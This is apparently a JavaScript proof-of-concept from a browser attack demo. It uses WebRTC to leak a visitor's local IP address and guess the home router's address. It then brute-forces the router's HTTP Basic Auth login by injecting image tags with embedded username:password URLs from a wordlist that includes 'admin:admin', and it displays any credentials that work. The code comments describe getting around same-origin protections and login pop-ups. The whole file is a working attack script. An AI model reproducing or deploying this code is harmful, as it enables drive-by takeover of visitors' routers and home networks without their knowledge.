function detectFirefox() {
    if (navigator.userAgent.toLowerCase().indexOf(&#39;firefox&#39;) &gt; -1) {
    //Do Firefox-related activities
    getLocalIP();
} else {
    document.write(&#39;&lt;h3&gt;Please use Mozilla Firefox to view this demo.&lt;/h3&gt;&#39;);
} 
}
function getLocalIP() {
    // Get local and public IP addresses in JavaScript
    // More info here: https://github.com/diafygi/webrtc-ips
    // See also this: http://www.reddit.com/r/netsec/comments/2ts3qm/get_local_and_public_ip_addresses_in_javascript/

    // NOTE: window.RTCPeerConnection is &#34;not a constructor&#34; in FF22/23
    var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

    if (RTCPeerConnection) (function () {
        var rtc = new RTCPeerConnection({iceServers:[]});
        if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
            rtc.createDataChannel(&#39;&#39;, {reliable:false});
        };

        rtc.onicecandidate = function (evt) {
            // convert the candidate to SDP so we can run it through our general parser
            // see https://twitter.com/lancestout/status/525796175425720320 for details
            if (evt.candidate) grepSDP(&#34;a=&#34;+evt.candidate.candidate);
        };
        rtc.createOffer(function (offerDesc) {
            grepSDP(offerDesc.sdp);
            rtc.setLocalDescription(offerDesc);
        }, function (e) { console.warn(&#34;offer failed&#34;, e); });
    
        var addrs = Object.create(null);
        addrs[&#34;0.0.0.0&#34;] = false;
        function updateDisplay(newAddr) {
            if (newAddr in addrs) return;
            else addrs[newAddr] = true;
            var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
            var localIP = displayAddrs.join(&#34; or perhaps &#34;) || &#34;n/a&#34;;
            document.getElementById(&#39;localIP&#39;).textContent = localIP;
            var routerIP = guessRouterIP(localIP);
            startAttack(routerIP);
        }
    
        function grepSDP(sdp) {
            var hosts = [];
            sdp.split(&#39;\r\n&#39;).forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
                if (~line.indexOf(&#34;a=candidate&#34;)) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                        var parts = line.split(&#39; &#39;),        // http://tools.ietf.org/html/rfc5245#section-15.1
                addr = parts[4],
                type = parts[7];
                        if (type === &#39;host&#39;) updateDisplay(addr);
                } else if (~line.indexOf(&#34;c=&#34;)) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                    var parts = line.split(&#39; &#39;),
                    addr = parts[2];
        
                    updateDisplay(addr);
                }
            });
        }
    })(); 
}
function guessRouterIP(localIP) {
    var router = localIP.slice(0, localIP.lastIndexOf(&#39;.&#39;)) + &#39;.1&#39;
    document.getElementById(&#39;routerIP&#39;).textContent = router;
    return router;
}


function startAttack(routerIP) {

    // TODO: add routers default passwords comobs to myWordlistArray
    var myWordlistArray = [&#34;1:1&#34;,&#34;2:2&#34;,&#34;3:3&#34;,&#34;4:4&#34;,&#34;5:5&#34;,&#34;6:6&#34;,&#34;7:7&#34;,&#34;8:8&#34;,&#34;9:9&#34;,&#34;10:10&#34;,&#34;11:11&#34;,&#34;12:12&#34;,&#34;13:13&#34;,&#34;14:14&#34;,&#34;15:15&#34;,&#34;16:16&#34;,&#34;17:17&#34;,&#34;18:18&#34;,&#34;19:19&#34;,&#34;20:20&#34;,&#34;21:21&#34;,&#34;22:22&#34;,&#34;23:23&#34;,&#34;24:24&#34;,&#34;25:25&#34;,&#34;26:26&#34;,&#34;27:27&#34;,&#34;28:28&#34;,&#34;29:29&#34;,&#34;30:30&#34;,&#34;31:31&#34;,&#34;32:32&#34;,&#34;33:33&#34;,&#34;34:34&#34;,&#34;35:35&#34;,&#34;36:36&#34;,&#34;37:37&#34;,&#34;admin:admin&#34;,&#34;39:39&#34;,&#34;40:40&#34;];

    var arrayLength = myWordlistArray.length;

    // Going trought myWordlistArray and creating iframes or images
    // For &#34;bypassing&#34; Same-origin policy

    for (var i = 0; i &lt; arrayLength; i++) {
        makeFrame(routerIP,myWordlistArray[i]);
    }
}

// Each frame is with random &#34;id&#34; so somehow
// HTTP Basic Auth is somehow not shoving pop-up with 401 responses
// It can be also bypassed with generating a lot of alerts, but you can&#39;t close it

// TODO: add local IP to this function, idea is to pass 2 parameters with setTimeout
// for testing purposes
// !! 

// Image here is TP-LINK logo, it will show green iframe after successful login

function makeFrame(routerIP,pass) {

    ifrm = document.createElement(&#34;img&#34;);
    ifrm.setAttribute(&#34;src&#34;, &#34;http://&#34; + pass + &#34;@192.168.101.1/images/top1_1.jpg&#34;);
    ifrm.setAttribute(&#34;id&#34;, Math.random());
    ifrm.style.width = 30+&#34;px&#34;;
    ifrm.style.height = 30+&#34;px&#34;;
    
    document.body.appendChild(ifrm);
    ifrm.onload = function() {
        var mySplitResult = pass.split(&#34;:&#34;);
        document.getElementById(&#39;username&#39;).textContent = mySplitResult[0];
        document.getElementById(&#39;password&#39;).textContent = mySplitResult[1];
    }
}

